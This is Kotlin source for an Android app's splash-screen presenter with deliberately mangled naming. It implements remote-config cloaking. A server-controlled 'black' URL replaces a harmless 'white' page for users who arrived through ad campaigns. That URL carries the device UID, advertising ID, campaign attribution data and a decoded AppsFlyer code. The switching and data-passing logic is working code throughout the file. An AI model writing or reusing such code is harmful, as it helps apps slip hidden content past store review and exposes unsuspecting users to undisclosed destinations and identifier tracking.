package com.matcha.para.appp.SplashActiivity28ola

import android.net.Uri
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.matcha.para.appp.URLStuff28ola.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class SplashPresenter28ola(private val splashActivityMethods28ola28Ola: SplashActivityContract28ola.SplashActivityMethods28ola) :
    SplashActivityContract28ola.SplashActivityPresenter28ola {

    private var finalString28ola: String? = null

    override fun thisEndsHere28ola() {
        splashActivityMethods28ola28Ola.onClickListener28ola {
            CoroutineScope(Dispatchers.Main).launch {
                delay(5000)
                finalString28ola =
                    if (fbBlackValue28ola == null || fbBlackValue28ola == "empty") {
                        fbWhiteValue28ola ?: return@launch
                    } else {
                        if (status28ola == "Non-organic") {
                            if (key28ola.toString().length != 20) {
                                Uri.parse(fbBlackValue28ola).buildUpon()
                                    .appendQueryParameter("key", fbDefaultValue28ola)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashActivityMethods28ola28Ola.getPackageName28ola()
                                    )
                                    .appendQueryParameter("sub4", adGroup28ola)
                                    .appendQueryParameter("sub5", adSet28ola)
                                    .appendQueryParameter("sub6", afChannel28ola)
                                    .appendQueryParameter("sub7", "Default")
                                    .toString()
                                    .plus(
                                        "&sub10=$uid28ola||$AID28ola||${
                                            decodeString28ola(CODE_APPSFLYER_28ola)
                                        }"
                                    )

                            } else {
                                Uri.parse(fbBlackValue28ola).buildUpon()
                                    .appendQueryParameter("key", key28ola)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashActivityMethods28ola28Ola.getPackageName28ola()
                                    )
                                    .appendQueryParameter("sub2", sub228ola)
                                    .appendQueryParameter("sub3", sub328ola)
                                    .appendQueryParameter("sub4", adGroup28ola)
                                    .appendQueryParameter("sub5", adSet28ola)
                                    .appendQueryParameter("sub6", afChannel28ola)
                                    .appendQueryParameter("sub7", mediaSource28ola)
                                    .toString()
                                    .plus(
                                        "&sub10=$uid28ola||$AID28ola||${
                                            decodeString28ola(CODE_APPSFLYER_28ola)
                                        }"
                                    )

                            }
                        } else {
                            Uri.parse(fbBlackValue28ola).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue28ola)
                                .appendQueryParameter(
                                    "bundle",
                                    splashActivityMethods28ola28Ola.getPackageName28ola()
                                )
                                .appendQueryParameter("sub7", "Organic")
                                .toString()
                                .plus(
                                    "&sub10=$uid28ola||$AID28ola||${
                                        decodeString28ola(CODE_APPSFLYER_28ola)
                                    }"
                                )

                        }
                    }
                splashActivityMethods28ola28Ola.startNewIntentWithURL28ola(
                    finalString28ola ?: return@launch
                )
            }
        }
    }


    override fun setupFB28ola() {
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_28ola to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue28ola = getString(FB_BLACK_KEY_28ola)
                    fbDefaultValue28ola = getString(FB_DEFAULT_KEY_28ola)
                    fbWhiteValue28ola = getString(FB_WHITE_KEY_28ola)
                }
            }
        }
    }
}
